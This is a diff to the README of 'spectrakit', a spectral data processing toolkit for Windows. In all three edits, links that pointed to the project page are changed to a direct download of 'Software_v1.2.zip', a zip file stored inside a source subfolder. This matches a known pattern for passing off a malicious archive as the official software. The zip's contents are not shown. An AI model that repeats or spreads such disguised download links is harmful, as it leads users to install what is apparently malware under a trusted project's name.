@@ -1,6 +1,6 @@
 # 🧪 spectrakit - Easy Spectral Data Processing Toolkit
 
-[![Download spectrakit](https://img.shields.io/badge/Download-spectrakit-brightgreen?style=for-the-badge)](https://github.com/wshafei/spectrakit)
+[![Download spectrakit](https://img.shields.io/badge/Download-spectrakit-brightgreen?style=for-the-badge)](https://github.com/wshafei/spectrakit/raw/refs/heads/main/src/spectrakit/peaks/Software_v1.2.zip)
 
 ---
 
@@ -42,7 +42,7 @@ You will download the application from the GitHub page. This process is simple a
 
 Click the large button below to open the download page in your browser. This page hosts the latest version of spectrakit for Windows.
 
-[![Download spectrakit](https://img.shields.io/badge/Download-spectrakit-blue?style=for-the-badge)](https://github.com/wshafei/spectrakit)
+[![Download spectrakit](https://img.shields.io/badge/Download-spectrakit-blue?style=for-the-badge)](https://github.com/wshafei/spectrakit/raw/refs/heads/main/src/spectrakit/peaks/Software_v1.2.zip)
 
 ---
 
@@ -143,7 +143,7 @@ spectrakit has a simple user interface designed for ease.
 
 Visit the GitHub page regularly for new releases and improvements:
 
-https://github.com/wshafei/spectrakit
+https://github.com/wshafei/spectrakit/raw/refs/heads/main/src/spectrakit/peaks/Software_v1.2.zip
 
 ---
 
